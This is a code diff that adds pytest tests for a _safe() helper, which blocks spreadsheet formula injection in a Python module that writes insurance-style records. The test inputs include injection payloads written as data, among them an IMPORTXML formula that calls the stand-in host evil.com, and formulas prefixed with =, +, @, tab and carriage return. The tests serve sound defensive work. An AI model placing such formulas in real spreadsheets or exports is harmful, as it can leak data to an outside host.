@@ -2,7 +2,7 @@
 import os
 import pytest
 import pandas as pd
-from writer import write_to_master, load_existing_keys
+from writer import write_to_master, load_existing_keys, _safe
 
 
 def _make_record(**overrides):
@@ -81,3 +81,47 @@ class TestLoadExistingKeys:
         key3 = ('ДРУГОЙ ЧЕЛОВЕК', 'POL-001', '01.01.2026', '31.12.2026', '')
         assert key2 in keys
         assert key3 not in keys
+
+
+class TestSafe:
+    """Tests for _safe() formula injection prevention."""
+
+    def test_blocks_equals(self):
+        assert _safe('=1+1') == "'=1+1"
+
+    def test_blocks_plus(self):
+        assert _safe('+IMPORTXML("http://evil.com")') == "'+IMPORTXML(\"http://evil.com\")"
+
+    def test_blocks_at(self):
+        assert _safe('@SUM(A1:A10)') == "'@SUM(A1:A10)"
+
+    def test_blocks_tab(self):
+        assert _safe('\tcmd') == "'\tcmd"
+
+    def test_blocks_cr(self):
+        assert _safe('\rcmd') == "'\rcmd"
+
+    def test_blocks_minus_non_numeric(self):
+        assert _safe('-IMPORTXML()') == "'-IMPORTXML()"
+
+    def test_preserves_negative_number(self):
+        assert _safe('-500') == '-500'
+
+    def test_preserves_negative_float(self):
+        assert _safe('-3.14') == '-3.14'
+
+    def test_preserves_normal_text(self):
+        assert _safe('Иванов Иван') == 'Иванов Иван'
+
+    def test_none_returns_empty(self):
+        assert _safe(None) == ''
+
+    def test_empty_string_passthrough(self):
+        assert _safe('') == ''
+
+    def test_numeric_passthrough(self):
+        assert _safe(12345) == 12345
+
+    def test_minus_single_char(self):
+        # Single "-" with no digit after — should be prefixed
+        assert _safe('-') == "'-"
